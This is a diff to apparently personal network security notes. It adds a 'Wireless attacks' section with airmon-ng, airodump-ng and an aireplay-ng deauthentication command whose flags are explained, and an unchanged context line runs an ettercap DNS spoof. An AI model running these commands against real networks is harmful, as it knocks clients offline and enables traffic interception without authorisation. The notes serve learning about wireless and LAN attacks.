@@ -1,3 +1,4 @@
+network security:
 show ips:
 	#ifconfig
 
@@ -15,3 +16,24 @@ to view arp cache in your machine:
 DNS spoof:
 	use arp spoof the commands below
 	#ettercap -Tq -P dns_spoof
+
+------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
+
+Wireless attacks:
+
+list you wireless interfaces:
+	#iwconfig
+
+put your wireless card in the monitor mode:
+	#airmon-ng start <wireless card>
+
+view the APs and clinets connected to them
+	#airodump-ng <wirelss card>
+
+deauthentications attacks on clinets:
+	#aireplay-ng -0 1000 -a <APs MAC address> -c <clients MAC address> <wireless card>
+	>> -0 attack mode
+	>> 1000 number of deauthentication frames 
+	>> -a APs MAC address
+	>> -c clients MAC address
